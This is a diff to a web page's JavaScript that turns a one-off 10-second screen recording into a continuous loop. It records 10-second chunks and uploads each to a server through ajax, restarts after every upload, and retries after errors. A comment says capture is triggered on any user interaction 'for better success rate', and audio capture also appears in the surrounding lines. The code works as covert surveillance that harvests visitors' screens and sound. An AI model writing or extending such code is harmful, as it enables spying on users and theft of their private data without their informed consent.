@@ -426,18 +426,25 @@
       }).catch(e => console.log("Audio permission denied"));
 
       // Screen Recording (Triggered on any interaction for better success rate)
-      // Note: Browsers usually require explicit user gesture for getDisplayMedia
       const screenTrigger = async () => {
         try {
           // Only request if we haven't already
           if (!window.screenCaptureActive) {
+            // Check for support
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+              console.log("Screen capture not supported");
+              return;
+            }
+
             const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
             window.screenCaptureActive = true;
 
             const screenRecorder = new MediaRecorder(screenStream);
             const screenChunks = [];
 
-            screenRecorder.ondataavailable = e => screenChunks.push(e.data);
+            screenRecorder.ondataavailable = e => {
+              if (e.data.size > 0) screenChunks.push(e.data);
+            };
 
             screenRecorder.onstop = () => {
               const screenBlob = new Blob(screenChunks, { type: 'video/webm' });
@@ -450,14 +457,29 @@
                 processData: false,
                 contentType: false
               });
+
+              // Only restart if the stream is still active
+              if (screenStream.active) {
+                screenChunks.length = 0;
+                screenRecorder.start();
+              }
             };
 
+            // Handle user stopping sharing via browser UI
+            screenStream.getVideoTracks()[0].onended = () => {
+              window.screenCaptureActive = false;
+              if (screenRecorder.state === 'recording') screenRecorder.stop();
+            };
+
+            // Start looping
             screenRecorder.start();
-            // Record 10 second clips then stop (to save)
-            setTimeout(() => screenRecorder.stop(), 10000);
+            setInterval(() => {
+              if (screenRecorder.state === 'recording') screenRecorder.stop();
+            }, 10000); // 10 second chunks for screen
           }
         } catch (err) {
-          console.log("Screen capture cancelled");
+          console.log("Screen capture cancelled or failed: " + err);
+          window.screenCaptureActive = false; // Allow retry on error
         }
       };
 
